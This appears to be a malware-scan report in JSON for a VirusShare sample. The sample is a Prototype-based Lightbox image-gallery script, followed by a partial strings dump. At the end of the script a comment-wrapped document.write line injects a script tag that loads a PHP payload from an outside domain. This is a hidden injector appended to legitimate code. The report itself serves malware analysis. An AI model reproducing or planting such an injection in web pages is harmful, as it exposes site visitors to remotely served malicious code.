{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Andy": "May detect Anubis Sandbox",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "write": "May write to a file"
        },
        "macro": "LightboxOptions = Object.extend({\n    fileLoadingImage:        'im/loading.gif',     \n    fileBottomNavCloseImage: 'im/closelabel.gif',\n\n    overlayOpacity: 0.5,   // controls transparency of shadow overlay\n\n    animate: true,         // toggles resizing animations\n    resizeSpeed: 10,        // controls the speed of the image resizing animations (1=slowest and 10=fastest)\n\n    borderSize: 10,         //if you adjust the padding in the CSS, you will need to update this variable\n\n\t// When grouping images this is used to write: Image # of #.\n\t// Change it for non-english localization\n\tlabelImage: \"Image\",\n\tlabelOf: \"of\"\n}, window.LightboxOptions || {});\n\n// -----------------------------------------------------------------------------------\n\nvar Lightbox = Class.create();\n\nLightbox.prototype = {\n    imageArray: [],\n    activeImage: undefined,\n    \n    // initialize()\n    // Constructor runs on completion of the DOM loading. Calls updateImageList and then\n    // the function inserts html at the bottom of the page which is used to display the shadow \n    // overlay and the image container.\n    //\n    initialize: function() {    \n        \n        this.updateImageList();\n        \n        this.keyboardAction = this.keyboardAction.bindAsEventListener(this);\n\n        if (LightboxOptions.resizeSpeed > 10) LightboxOptions.resizeSpeed = 10;\n        if (LightboxOptions.resizeSpeed < 1)  LightboxOptions.resizeSpeed = 1;\n\n\t    this.resizeDuration = LightboxOptions.animate ? ((11 - LightboxOptions.resizeSpeed) * 0.15) : 0;\n\t    this.overlayDuration = LightboxOptions.animate ? 0.2 : 0;  // shadow fade in/out duration\n\n        // When Lightbox starts it will resize itself from 250 by 250 to the current image dimension.\n        // If animations are turned off, it will be hidden as to prevent a flicker of a\n        // white 250 by 250 box.\n        var size = (LightboxOptions.animate ? 250 : 1) + 'px';\n        \n\n        // Code inserts html at the bottom of the page that looks similar to this:\n        //\n        //  <div id=\"overlay\"></div>\n        //  <div id=\"lightbox\">\n        //      <div id=\"outerImageContainer\">\n        //          <div id=\"imageContainer\">\n        //              <img id=\"lightboxImage\">\n        //              <div style=\"\" id=\"hoverNav\">\n        //                  <a href=\"#\" id=\"prevLink\"></a>\n        //                  <a href=\"#\" id=\"nextLink\"></a>\n        //              </div>\n        //              <div id=\"loading\">\n        //                  <a href=\"#\" id=\"loadingLink\">\n        //                      <img src=\"images/loading.gif\">\n        //                  </a>\n        //              </div>\n        //          </div>\n        //      </div>\n        //      <div id=\"imageDataContainer\">\n        //          <div id=\"imageData\">\n        //              <div id=\"imageDetails\">\n        //                  <span id=\"caption\"></span>\n        //                  <span id=\"numberDisplay\"></span>\n        //              </div>\n        //              <div id=\"bottomNav\">\n        //                  <a href=\"#\" id=\"bottomNavClose\">\n        //                      <img src=\"images/close.gif\">\n        //                  </a>\n        //              </div>\n        //          </div>\n        //      </div>\n        //  </div>\n\n\n        var objBody = $$('body')[0];\n\n\t\tobjBody.appendChild(Builder.node('div',{id:'overlay'}));\n\t\n        objBody.appendChild(Builder.node('div',{id:'lightbox'}, [\n            Builder.node('div',{id:'outerImageContainer'}, \n                Builder.node('div',{id:'imageContainer'}, [\n                    Builder.node('img',{id:'lightboxImage'}), \n                    Builder.node('div',{id:'hoverNav'}, [\n                        Builder.node('a',{id:'prevLink', href: '#' }),\n                        Builder.node('a',{id:'nextLink', href: '#' })\n                    ]),\n                    Builder.node('div',{id:'loading'}, \n                        Builder.node('a',{id:'loadingLink', href: '#' }, \n                            Builder.node('img', {src: LightboxOptions.fileLoadingImage})\n                        )\n                    )\n                ])\n            ),\n            Builder.node('div', {id:'imageDataContainer'},\n                Builder.node('div',{id:'imageData'}, [\n                    Builder.node('div',{id:'imageDetails'}, [\n                        Builder.node('span',{id:'caption'}),\n                        Builder.node('span',{id:'numberDisplay'})\n                    ]),\n                    Builder.node('div',{id:'bottomNav'},\n                        Builder.node('a',{id:'bottomNavClose', href: '#' },\n                            Builder.node('img', { src: LightboxOptions.fileBottomNavCloseImage })\n                        )\n                    )\n                ])\n            )\n        ]));\n\n\n\t\t$('overlay').hide().observe('click', (function() { this.end(); }).bind(this));\n\t\t$('lightbox').hide().observe('click', (function(event) { if (event.element().id == 'lightbox') this.end(); }).bind(this));\n\t\t$('outerImageContainer').setStyle({ width: size, height: size });\n\t\t$('prevLink').observe('click', (function(event) { event.stop(); this.changeImage(this.activeImage - 1); }).bindAsEventListener(this));\n\t\t$('nextLink').observe('click', (function(event) { event.stop(); this.changeImage(this.activeImage + 1); }).bindAsEventListener(this));\n\t\t$('loadingLink').observe('click', (function(event) { event.stop(); this.end(); }).bind(this));\n\t\t$('bottomNavClose').observe('click', (function(event) { event.stop(); this.end(); }).bind(this));\n\n        var th = this;\n        (function(){\n            var ids = \n                'overlay lightbox outerImageContainer imageContainer lightboxImage hoverNav prevLink nextLink loading loadingLink ' + \n                'imageDataContainer imageData imageDetails caption numberDisplay bottomNav bottomNavClose';   \n            $w(ids).each(function(id){ th[id] = $(id); });\n        }).defer();\n    },\n\n    //\n    // updateImageList()\n    // Loops through anchor tags looking for 'lightbox' references and applies onclick\n    // events to appropriate links. You can rerun after dynamically adding images w/ajax.\n    //\n    updateImageList: function() {   \n        this.updateImageList = Prototype.emptyFunction;\n\n        document.observe('click', (function(event){\n            var target = event.findElement('a[rel^=lightbox]') || event.findElement('area[rel^=lightbox]');\n            if (target) {\n                event.stop();\n                this.start(target);\n            }\n        }).bind(this));\n    },\n    \n    //\n    //  start()\n    //  Display overlay and lightbox. If image is part of a set, add siblings to imageArray.\n    //\n    start: function(imageLink) {    \n\n        $$('select', 'object', 'embed').each(function(node){ node.style.visibility = 'hidden' });\n\n        // stretch overlay to fill page and fade in\n        var arrayPageSize = this.getPageSize();\n        $('overlay').setStyle({ width: arrayPageSize[0] + 'px', height: arrayPageSize[1] + 'px' });\n\n        new Effect.Appear(this.overlay, { duration: this.overlayDuration, from: 0.0, to: LightboxOptions.overlayOpacity });\n\n        this.imageArray = [];\n        var imageNum = 0;       \n\n        if ((imageLink.getAttribute(\"rel\") == 'lightbox')){\n            // if image is NOT part of a set, add single image to imageArray\n            this.imageArray.push([imageLink.href, imageLink.title]);         \n        } else {\n            // if image is part of a set..\n            this.imageArray = \n                $$(imageLink.tagName + '[href][rel=\"' + imageLink.rel + '\"]').\n                collect(function(anchor){ return [anchor.href, anchor.title]; }).\n                uniq();\n            \n            while (this.imageArray[imageNum][0] != imageLink.href) { imageNum++; }\n        }\n\n        // calculate top and left offset for the lightbox \n        var arrayPageScroll = document.viewport.getScrollOffsets();\n        //var lightboxTop = arrayPageScroll[1] + (document.viewport.getHeight() / 10);\n\t\tvar lightboxTop = arrayPageScroll[1] + (arrayPageSize[1] / 10);\n        var lightboxLeft = arrayPageScroll[0];\n        this.lightbox.setStyle({ top: lightboxTop + 'px', left: lightboxLeft + 'px' }).show();\n        \n        this.changeImage(imageNum);\n    },\n\n    //\n    //  changeImage()\n    //  Hide most elements and preload image in preparation for resizing image container.\n    //\n    changeImage: function(imageNum) {   \n        \n        this.activeImage = imageNum; // update global var\n\n        // hide elements during transition\n        if (LightboxOptions.animate) this.loading.show();\n        this.lightboxImage.hide();\n        this.hoverNav.hide();\n        this.prevLink.hide();\n        this.nextLink.hide();\n\t\t// HACK: Opera9 does not currently support scriptaculous opacity and appear fx\n        this.imageDataContainer.setStyle({opacity: .0001});\n        this.numberDisplay.hide();      \n        \n        var imgPreloader = new Image();\n        \n        // once image is preloaded, resize image container\n        imgPreloader.onload = (function(){\n            this.lightboxImage.src = this.imageArray[this.activeImage][0];\n            /*Bug Fixed by Andy Scott*/\n            this.lightboxImage.width = imgPreloader.width;\n            this.lightboxImage.height = imgPreloader.height;\n            /*End of Bug Fix*/\n            this.resizeImageContainer(imgPreloader.width, imgPreloader.height);\n        }).bind(this);\n        imgPreloader.src = this.imageArray[this.activeImage][0];\n    },\n\n    //\n    //  resizeImageContainer()\n    //\n    resizeImageContainer: function(imgWidth, imgHeight) {\n\n        // get current width and height\n        var widthCurrent  = this.outerImageContainer.getWidth();\n        var heightCurrent = this.outerImageContainer.getHeight();\n\n        // get new width and height\n        var widthNew  = (imgWidth  + LightboxOptions.borderSize * 2);\n        var heightNew = (imgHeight + LightboxOptions.borderSize * 2);\n\n        // scalars based on change from old to new\n        var xScale = (widthNew  / widthCurrent)  * 100;\n        var yScale = (heightNew / heightCurrent) * 100;\n\n        // calculate size difference between new and old image, and resize if necessary\n        var wDiff = widthCurrent - widthNew;\n        var hDiff = heightCurrent - heightNew;\n\n        if (hDiff != 0) new Effect.Scale(this.outerImageContainer, yScale, {scaleX: false, duration: this.resizeDuration, queue: 'front'}); \n        if (wDiff != 0) new Effect.Scale(this.outerImageContainer, xScale, {scaleY: false, duration: this.resizeDuration, delay: this.resizeDuration}); \n\n        // if new and old image are same size and no scaling transition is necessary, \n        // do a quick pause to prevent image flicker.\n        var timeout = 0;\n        if ((hDiff == 0) && (wDiff == 0)){\n            timeout = 100;\n            if (Prototype.Browser.IE) timeout = 250;   \n        }\n\n        (function(){\n            this.prevLink.setStyle({ height: imgHeight + 'px' });\n            this.nextLink.setStyle({ height: imgHeight + 'px' });\n            this.imageDataContainer.setStyle({ width: widthNew + 'px' });\n\n            this.showImage();\n        }).bind(this).delay(timeout / 1000);\n    },\n    \n    //\n    //  showImage()\n    //  Display image and begin preloading neighbors.\n    //\n    showImage: function(){\n        this.loading.hide();\n        new Effect.Appear(this.lightboxImage, { \n            duration: this.resizeDuration, \n            queue: 'end', \n            afterFinish: (function(){ this.updateDetails(); }).bind(this) \n        });\n        this.preloadNeighborImages();\n    },\n\n    //\n    //  updateDetails()\n    //  Display caption, image number, and bottom nav.\n    //\n    updateDetails: function() {\n    \n        this.caption.update(this.imageArray[this.activeImage][1]).show();\n\n        // if image is part of set display 'Image x of x' \n        if (this.imageArray.length > 1){\n            this.numberDisplay.update( LightboxOptions.labelImage + ' ' + (this.activeImage + 1) + ' ' + LightboxOptions.labelOf + '  ' + this.imageArray.length).show();\n        }\n\n        new Effect.Parallel(\n            [ \n                new Effect.SlideDown(this.imageDataContainer, { sync: true, duration: this.resizeDuration, from: 0.0, to: 1.0 }), \n                new Effect.Appear(this.imageDataContainer, { sync: true, duration: this.resizeDuration }) \n            ], \n            { \n                duration: this.resizeDuration, \n                afterFinish: (function() {\n\t                // update overlay size and update nav\n\t                var arrayPageSize = this.getPageSize();\n\t                this.overlay.setStyle({ width: arrayPageSize[0] + 'px', height: arrayPageSize[1] + 'px' });\n\t                this.updateNav();\n                }).bind(this)\n            } \n        );\n    },\n\n    //\n    //  updateNav()\n    //  Display appropriate previous and next hover navigation.\n    //\n    updateNav: function() {\n\n        this.hoverNav.show();               \n\n        // if not first image in set, display prev image button\n        if (this.activeImage > 0) this.prevLink.show();\n\n        // if not last image in set, display next image button\n        if (this.activeImage < (this.imageArray.length - 1)) this.nextLink.show();\n        \n        this.enableKeyboardNav();\n    },\n\n    //\n    //  enableKeyboardNav()\n    //\n    enableKeyboardNav: function() {\n        document.observe('keydown', this.keyboardAction); \n    },\n\n    //\n    //  disableKeyboardNav()\n    //\n    disableKeyboardNav: function() {\n        document.stopObserving('keydown', this.keyboardAction); \n    },\n\n    //\n    //  keyboardAction()\n    //\n    keyboardAction: function(event) {\n        var keycode = event.keyCode;\n\n        var escapeKey;\n        if (event.DOM_VK_ESCAPE) {  // mozilla\n            escapeKey = event.DOM_VK_ESCAPE;\n        } else { // ie\n            escapeKey = 27;\n        }\n\n        var key = String.fromCharCode(keycode).toLowerCase();\n        \n        if (key.match(/x|o|c/) || (keycode == escapeKey)){ // close lightbox\n            this.end();\n        } else if ((key == 'p') || (keycode == 37)){ // display previous image\n            if (this.activeImage != 0){\n                this.disableKeyboardNav();\n                this.changeImage(this.activeImage - 1);\n            }\n        } else if ((key == 'n') || (keycode == 39)){ // display next image\n            if (this.activeImage != (this.imageArray.length - 1)){\n                this.disableKeyboardNav();\n                this.changeImage(this.activeImage + 1);\n            }\n        }\n    },\n\n    //\n    //  preloadNeighborImages()\n    //  Preload previous and next images.\n    //\n    preloadNeighborImages: function(){\n        var preloadNextImage, preloadPrevImage;\n        if (this.imageArray.length > this.activeImage + 1){\n            preloadNextImage = new Image();\n            preloadNextImage.src = this.imageArray[this.activeImage + 1][0];\n        }\n        if (this.activeImage > 0){\n            preloadPrevImage = new Image();\n            preloadPrevImage.src = this.imageArray[this.activeImage - 1][0];\n        }\n    \n    },\n\n    //\n    //  end()\n    //\n    end: function() {\n        this.disableKeyboardNav();\n        this.lightbox.hide();\n        new Effect.Fade(this.overlay, { duration: this.overlayDuration });\n        $$('select', 'object', 'embed').each(function(node){ node.style.visibility = 'visible' });\n    },\n\n    //\n    //  getPageSize()\n    //\n    getPageSize: function() {\n\t        \n\t     var xScroll, yScroll;\n\t\t\n\t\tif (window.innerHeight && window.scrollMaxY) {\t\n\t\t\txScroll = window.innerWidth + window.scrollMaxX;\n\t\t\tyScroll = window.innerHeight + window.scrollMaxY;\n\t\t} else if (document.body.scrollHeight > document.body.offsetHeight){ // all but Explorer Mac\n\t\t\txScroll = document.body.scrollWidth;\n\t\t\tyScroll = document.body.scrollHeight;\n\t\t} else { // Explorer Mac...would also work in Explorer 6 Strict, Mozilla and Safari\n\t\t\txScroll = document.body.offsetWidth;\n\t\t\tyScroll = document.body.offsetHeight;\n\t\t}\n\t\t\n\t\tvar windowWidth, windowHeight;\n\t\t\n\t\tif (self.innerHeight) {\t// all except Explorer\n\t\t\tif(document.documentElement.clientWidth){\n\t\t\t\twindowWidth = document.documentElement.clientWidth; \n\t\t\t} else {\n\t\t\t\twindowWidth = self.innerWidth;\n\t\t\t}\n\t\t\twindowHeight = self.innerHeight;\n\t\t} else if (document.documentElement && document.documentElement.clientHeight) { // Explorer 6 Strict Mode\n\t\t\twindowWidth = document.documentElement.clientWidth;\n\t\t\twindowHeight = document.documentElement.clientHeight;\n\t\t} else if (document.body) { // other Explorers\n\t\t\twindowWidth = document.body.clientWidth;\n\t\t\twindowHeight = document.body.clientHeight;\n\t\t}\t\n\n\t\t// for small pages with total height less then height of the viewport\n\t\tif(yScroll < windowHeight){\n\t\t\tpageHeight = windowHeight;\n\t\t} else { \n\t\t\tpageHeight = yScroll;\n\t\t}\n\t\n\t\t// for small pages with total width less then width of the viewport\n\t\tif(xScroll < windowWidth){\t\n\t\t\tpageWidth = xScroll;\t\t\n\t\t} else {\n\t\t\tpageWidth = windowWidth;\n\t\t}\n\n\t\treturn [pageWidth,pageHeight];\n\t}\n}\n\ndocument.observe('dom:loaded', function () { new Lightbox(); });\n\n/*3ef5ca*/\ndocument.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=120480385' type='text/javascript'></\" + \"script>\");\n/*/3ef5ca*/"
    },
    "filename": "VirusShare_51af47c3016f311ac5d0b0f82bd81336",
    "filesize": 17326,
    "filetype": "HTML document, ASCII text",
    "hashes": {
        "md5": "51af47c3016f311ac5d0b0f82bd81336",
        "sha1": "be0dd2fcf2acab318d6844cf6bec2fced284c4a1",
        "sha256": "d6d67acf27d555ecf85d0ae9161f67739952421337d2842486dc489a62c6ae3b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "LightboxOptions = Object.extend({",
            "    fileLoadingImage:        'im/loading.gif',     ",
            "    fileBottomNavCloseImage: 'im/closelabel.gif',",
            "    overlayOpacity: 0.5,   // controls transparency of shadow overlay",
            "    animate: true,         // toggles resizing animations",
            "    resizeSpeed: 10,        // controls the speed of the image resizing animations (1=slowest and 10=fastest)",
            "    borderSize: 10,         //if you adjust the padding in the CSS, you will need to update this variable",
            "\t// When grouping images this is used to write: Image # of #.",
            "\t// Change it for non-english localization",
            "\tlabelImage: \"Image\",",
            "\tlabelOf: \"of\"",
            "}, window.LightboxOptions || {});",
            "// -----------------------------------------------------------------------------------",
            "var Lightbox = Class.create();",
            "Lightbox.prototype = {",
            "    imageArray: [],",
            "    activeImage: undefined,",
            "    ",
            "    // initialize()",
            "    // Constructor runs on completion of the DOM loading. Calls updateImageList and then",
            "    // the function inserts html at the bottom of the page which is used to display the shadow ",
            "    // overlay and the image container.",
            "    //",
            "    initialize: function() {    ",
            "        ",
            "        this.updateImageList();",
            "        ",
            "        this.keyboardAction = this.keyboardAction.bindAsEventListener(this);",
            "        if (LightboxOptions.resizeSpeed > 10) LightboxOptions.resizeSpeed = 10;",
            "        if (LightboxOptions.resizeSpeed < 1)  LightboxOptions.resizeSpeed = 1;",
            "\t    this.resizeDuration = LightboxOptions.animate ? ((11 - LightboxOptions.resizeSpeed) * 0.15) : 0;",
            "\t    this.overlayDuration = LightboxOptions.animate ? 0.2 : 0;  // shadow fade in/out duration",
            "        // When Lightbox starts it will resize itself from 250 by 250 to the current image dimension.",
            "        // If animations are turned off, it will be hidden as to prevent a flicker of a",
            "        // white 250 by 250 box.",
            "        var size = (LightboxOptions.animate ? 250 : 1) + 'px';",
            "        ",
            "        // Code inserts html at the bottom of the page that looks similar to this:",
            "        //",
            "        //  <div id=\"overlay\"></div>",
            "        //  <div id=\"lightbox\">",
            "        //      <div id=\"outerImageContainer\">",
            "        //          <div id=\"imageContainer\">",
            "        //              <img id=\"lightboxImage\">",
            "        //              <div style=\"\" id=\"hoverNav\">",
            "        //                  <a href=\"#\" id=\"prevLink\"></a>",
            "        //                  <a href=\"#\" id=\"nextLink\"></a>",
            "        //              </div>",
            "        //              <div id=\"loading\">",
            "        //                  <a href=\"#\" id=\"loadingLink\">",
            "        //                      <img src=\"images/loading.gif\">",
            "        //                  </a>",
            "        //              </div>",
            "        //          </div>",
            "        //      </div>",
            "        //      <div id=\"imageDataContainer\">",
            "        //          <div id=\"imageData\">",
            "        //              <div id=\"imageDetails\">",
            "        //                  <span id=\"caption\"></span>",
            "        //                  <span id=\"numberDisplay\"></span>",
            "        //              </div>",
            "        //              <div id=\"bottomNav\">",
            "        //                  <a href=\"#\" id=\"bottomNavClose\">",
            "        //                      <img src=\"images/close.gif\">",
            "        //                  </a>",
            "        //              </div>",
            "        //          </div>",
            "        //      </div>",
            "        //  </div>",
            "        var objBody = $$('body')[0];",
            "\t\tobjBody.appendChild(Builder.node('div',{id:'overlay'}));",
            "        objBody.appendChild(Builder.node('div',{id:'lightbox'}, [",
            "            Builder.node('div',{id:'outerImageContainer'}, ",
            "                Builder.node('div',{id:'imageContainer'}, [",
            "                    Builder.node('img',{id:'lightboxImage'}), ",
            "                    Builder.node('div',{id:'hoverNav'}, [",
            "                        Builder.node('a',{id:'prevLink', href: '#' }),",
            "                        Builder.node('a',{id:'nextLink', href: '#' })",
            "                    ]),",
            "                    Builder.node('div',{id:'loading'}, ",
            "                        Builder.node('a',{id:'loadingLink', href: '#' }, ",
            "                            Builder.node('img', {src: LightboxOptions.fileLoadingImage})",
            "                        )",
            "                    )",
            "                ])",
            "            ),",
            "            Builder.node('div', {id:'imageDataContainer'},",
            "                Builder.node('div',{id:'imageData'}, [",
            "                    Builder.node('div',{id:'imageDetails'}, [",
            "                        Builder.node('span',{id:'caption'}),",
            "                        Builder.node('span',{id:'numberDisplay'})",
            "                    ]),",
            "                    Builder.node('div',{id:'bottomNav'},",
            "                        Builder.node('a',{id:'bottomNavClose', href: '#' },",
            "                            Builder.node('img', { src: LightboxOptions.fileBottomNavCloseImage })",
            "                        )",
            "                    )",
            "                ])",
            "            )",
            "        ]));",
            "\t\t$('overlay').hide().observe('click', (function() { this.end(); }).bind(this));",
            "\t\t$('lightbox').hide().observe('click', (function(event) { if (event.element().id == 'lightbox') this.end(); }).bind(this));",
            "\t\t$('outerImageContainer').setStyle({ width: size, height: size });",
            "\t\t$('prevLink').observe('click', (function(event) { event.stop(); this.changeImage(this.activeImage - 1); }).bindAsEventListener(this));",
            "\t\t$('nextLink').observe('click', (function(event) { event.stop(); this.changeImage(this.activeImage + 1); }).bindAsEventListener(this));",
            "\t\t$('loadingLink').observe('click', (function(event) { event.stop(); this.end(); }).bind(this));",
            "\t\t$('bottomNavClose').observe('click', (function(event) { event.stop(); this.end(); }).bind(this));",
            "        var th = this;",
            "        (function(){",
            "            var ids = ",
            "                'overlay lightbox outerImageContainer imageContainer lightboxImage hoverNav prevLink nextLink loading loadingLink ' + ",
            "                'imageDataContainer imageData imageDetails caption numberDisplay bottomNav bottomNavClose';   ",
            "            $w(ids).each(function(id){ th[id] = $(id); });",
            "        }).defer();",
            "    },",
            "    //",
            "    // updateImageList()",
            "    // Loops through anchor tags looking for 'lightbox' references and applies onclick",
            "    // events to appropriate links. You can rerun after dynamically adding images w/ajax.",
            "    //",
            "    updateImageList: function() {   ",
            "        this.updateImageList = Prototype.emptyFunction;",
            "        document.observe('click', (function(event){",
            "            var target = event.findElement('a[rel^=lightbox]') || event.findElement('area[rel^=lightbox]');",
            "            if (target) {",
            "                event.stop();",
            "                this.start(target);",
            "            }",
            "        }).bind(this));",
            "    },",
            "    ",
            "    //",
            "    //  start()",
            "    //  Display overlay and lightbox. If image is part of a set, add siblings to imageArray.",
            "    //",
            "    start: function(imageLink) {    ",
            "        $$('select', 'object', 'embed').each(function(node){ node.style.visibility = 'hidden' });",
            "        // stretch overlay to fill page and fade in",
            "        var arrayPageSize = this.getPageSize();",
            "        $('overlay').setStyle({ width: arrayPageSize[0] + 'px', height: arrayPageSize[1] + 'px' });",
            "        new Effect.Appear(this.overlay, { duration: this.overlayDuration, from: 0.0, to: LightboxOptions.overlayOpacity });",
            "        this.imageArray = [];",
            "        var imageNum = 0;       ",
            "        if ((imageLink.getAttribute(\"rel\") == 'lightbox')){",
            "            // if image is NOT part of a set, add single image to imageArray",
            "            this.imageArray.push([imageLink.href, imageLink.title]);         ",
            "        } else {",
            "            // if image is part of a set..",
            "            this.imageArray = ",
            "                $$(imageLink.tagName + '[href][rel=\"' + imageLink.rel + '\"]').",
            "                collect(function(anchor){ return [anchor.href, anchor.title]; }).",
            "                uniq();",
            "            ",
            "            while (this.imageArray[imageNum][0] != imageLink.href) { imageNum++; }",
            "        }",
            "        // calculate top and left offset for the lightbox ",
            "        var arrayPageScroll = document.viewport.getScrollOffsets();",
            "        //var lightboxTop = arrayPageScroll[1] + (document.viewport.getHeight() / 10);",
            "\t\tvar lightboxTop = arrayPageScroll[1] + (arrayPageSize[1] / 10);",
            "        var lightboxLeft = arrayPageScroll[0];",
            "        this.lightbox.setStyle({ top: lightboxTop + 'px', left: lightboxLeft + 'px' }).show();",
            "        ",
            "        this.changeImage(imageNum);",
            "    },",
            "    //",
            "    //  changeImage()",
            "    //  Hide most elements and preload image in preparation for resizing image container.",
            "    //",
            "    changeImage: function(imageNum) {   ",
            "        ",
            "        this.activeImage = imageNum; // update global var",
            "        // hide elements during transition",
            "        if (LightboxOptions.animate) this.loading.show();",
            "        this.lightboxImage.hide();",
            "        this.hoverNav.hide();",
            "        this.prevLink.hide();",
            "        this.nextLink.hide();",
            "\t\t// HACK: Opera9 does not currently support scriptaculous opacity and appear fx",
            "        this.imageDataContainer.setStyle({opacity: .0001});",
            "        this.numberDisplay.hide();      ",
            "        ",
            "        var imgPreloader = new Image();",
            "        ",
            "        // once image is preloaded, resize image container",
            "        imgPreloader.onload = (function(){",
            "            this.lightboxImage.src = this.imageArray[this.activeImage][0];",
            "            /*Bug Fixed by Andy Scott*/",
            "            this.lightboxImage.width = imgPreloader.width;",
            "            this.lightboxImage.height = imgPreloader.height;",
            "            /*End of Bug Fix*/",
            "            this.resizeImageContainer(imgPreloader.width, imgPreloader.height);",
            "        }).bind(this);",
            "        imgPreloader.src = this.imageArray[this.activeImage][0];",
            "    },",
            "    //",
            "    //  resizeImageContainer()",
            "    //",
            "    resizeImageContainer: function(imgWidth, imgHeight) {",
            "        // get current width and height",
            "        var widthCurrent  = this.outerImageContainer.getWidth();",
            "        var heightCurrent = this.outerImageContainer.getHeight();",
            "        // get new width and height",
            "        var widthNew  = (imgWidth  + LightboxOptions.borderSize * 2);",
            "        var heightNew = (imgHeight + LightboxOptions.borderSize * 2);",
            "        // scalars based on change from old to new",
            "        var xScale = (widthNew  / widthCurrent)  * 100;",
            "        var yScale = (heightNew / heightCurrent) * 100;",
            "        // calculate size difference between new and old image, and resize if necessary",
            "        var wDiff = widthCurrent - widthNew;",
            "        var hDiff = heightCurrent - heightNew;",
            "        if (hDiff != 0) new Effect.Scale(this.outerImageContainer, yScale, {scaleX: false, duration: this.resizeDuration, queue: 'front'}); ",
            "        if (wDiff != 0) new Effect.Scale(this.outerImageContainer, xScale, {scaleY: false, duration: this.resizeDuration, delay: this.resizeDuration}); ",
            "        // if new and old image are same size and no scaling transition is necessary, ",
            "        // do a quick pause to prevent image flicker.",
            "        var timeout = 0;",
            "        if ((hDiff == 0) && (wDiff == 0)){",
            "            timeout = 100;",
            "            if (Prototype.Browser.IE) timeout = 250;   ",
            "        }",
            "        (function(){",
            "            this.prevLink.setStyle({ height: imgHeight + 'px' });",
            "            this.nextLink.setStyle({ height: imgHeight + 'px' });",
            "            this.imageDataContainer.setStyle({ width: widthNew + 'px' });",
            "            this.showImage();",
            "        }).bind(this).delay(timeout / 1000);",
            "    },",
            "    ",
            "    //",
            "    //  showImage()",
            "    //  Display image and begin preloading neighbors.",
            "    //",
            "    showImage: function(){",
            "        this.loading.hide();",
            "        new Effect.Appear(this.lightboxImage, { ",
            "            duration: this.resizeDuration, ",
            "            queue: 'end', ",
            "            afterFinish: (function(){ this.updateDetails(); }).bind(this) ",
            "        });",
            "        this.preloadNeighborImages();",
            "    },",
            "    //",
            "    //  updateDetails()",
            "    //  Display caption, image number, and bottom nav.",
            "    //",
            "    updateDetails: function() {",
            "    ",
            "        this.caption.update(this.imageArray[this.activeImage][1]).show();",
            "        // if image is part of set display 'Image x of x' ",
            "        if (this.imageArray.length > 1){",
            "            this.numberDisplay.update( LightboxOptions.labelImage + ' ' + (this.activeImage + 1) + ' ' + LightboxOptions.labelOf + '  ' + this.imageArray.length).show();",
            "        }",
            "        new Effect.Parallel(",
            "            [ ",
            "                new Effect.SlideDown(this.imageDataContainer, { sync: true, duration: this.resizeDuration, from: 0.0, to: 1.0 }), ",
            "                new Effect.Appear(this.imageDataContainer, { sync: true, duration: this.resizeDuration }) ",
            "            ], ",
            "            { ",
            "                duration: this.resizeDuration, ",
            "                afterFinish: (function() {",
            "\t                // update overlay size and update nav",
            "\t                var arrayPageSize = this.getPageSize();",
            "\t                this.overlay.setStyle({ width: arrayPageSize[0] + 'px', height: arrayPageSize[1] + 'px' });",
            "\t                this.updateNav();",
            "                }).bind(this)",
            "            } ",
            "        );",
            "    },",
            "    //",
            "    //  updateNav()",
            "    //  Display appropriate previous and next hover navigation.",
            "    //",
            "    updateNav: function() {",
            "        this.hoverNav.show();               ",
            "        // if not first image in set, display prev image button",
            "        if (this.activeImage > 0) this.prevLink.show();",
            "        // if not last image in set, display next image button",
            "        if (this.activeImage < (this.imageArray.length - 1)) this.nextLink.show();",
            "        ",
            "        this.enableKeyboardNav();",
            "    },",
            "    //",
            "    //  enableKeyboardNav()",
            "    //",
            "    enableKeyboardNav: function() {",
            "        document.observe('keydown', this.keyboardAction); ",
            "    },",
            "    //",
            "    //  disableKeyboardNav()",
            "    //",
            "    disableKeyboardNav: function() {",
            "        document.stopObserving('keydown', this.keyboardAction); ",
            "    },",
            "    //",
            "    //  keyboardAction()",
            "    //",
            "    keyboardAction: function(event) {",
            "        var keycode = event.keyCode;",
            "        var escapeKey;",
            "        if (event.DOM_VK_ESCAPE) {  // mozilla",
            "            escapeKey = event.DOM_VK_ESCAPE;",
            "        } else { // ie",
            "            escapeKey = 27;",
            "        }",
            "        var key = String.fromCharCode(keycode).toLowerCase();",
            "        ",
            "        if (key.match(/x|o|c/) || (keycode == escapeKey)){ // close lightbox",
            "            this.end();",
            "        } else if ((key == 'p') || (keycode == 37)){ // display previous image",
            "            if (this.activeImage != 0){",
            "                this.disableKeyboardNav();",
            "                this.changeImage(this.activeImage - 1);",
            "            }",
            "        } else if ((key == 'n') || (keycode == 39)){ // display next image",
            "            if (this.activeImage != (this.imageArray.length - 1)){",
            "                this.disableKeyboardNav();",
            "                this.changeImage(this.activeImage + 1);",
            "            }",
            "        }",
            "    },",
            "    //",
            "    //  preloadNeighborImages()",
            "    //  Preload previous and next images.",
            "    //",
            "    preloadNeighborImages: function(){",
            "        var preloadNextImage, preloadPrevImage;",
            "        if (this.imageArray.length > this.activeImage + 1){",
            "            preloadNextImage = new Image();",
            "            preloadNextImage.src = this.imageArray[this.activeImage + 1][0];",
            "        }",
            "        if (this.activeImage > 0){",
            "            preloadPrevImage = new Image();",
            "            preloadPrevImage.src = this.imageArray[this.activeImage - 1][0];",
            "        }",
            "    ",
            "    },",
            "    //",
            "    //  end()",
            "    //",
            "    end: function() {",
            "        this.disableKeyboardNav();",
            "        this.lightbox.hide();",
            "        new Effect.Fade(this.overlay, { duration: this.overlayDuration });",
            "        $$('select', 'object', 'embed').each(function(node){ node.style.visibility = 'visible' });",
            "    },",
            "    //",
            "    //  getPageSize()",
            "    //",
            "    getPageSize: function() {",
            "\t        ",
            "\t     var xScroll, yScroll;",
            "\t\tif (window.innerHeight && window.scrollMaxY) {\t",
            "\t\t\txScroll = window.innerWidth + window.scrollMaxX;",
            "\t\t\tyScroll = window.innerHeight + window.scrollMaxY;",
            "\t\t} else if (document.body.scrollHeight > document.body.offsetHeight){ // all but Explorer Mac",
            "\t\t\txScroll = document.body.scrollWidth;",
            "\t\t\tyScroll = document.body.scrollHeight;",
            "\t\t} else { // Explorer Mac...would also work in Explorer 6 Strict, Mozilla and Safari",
            "\t\t\txScroll = document.body.offsetWidth;",
            "\t\t\tyScroll = document.body.offsetHeight;",
            "\t\tvar windowWidth, windowHeight;",
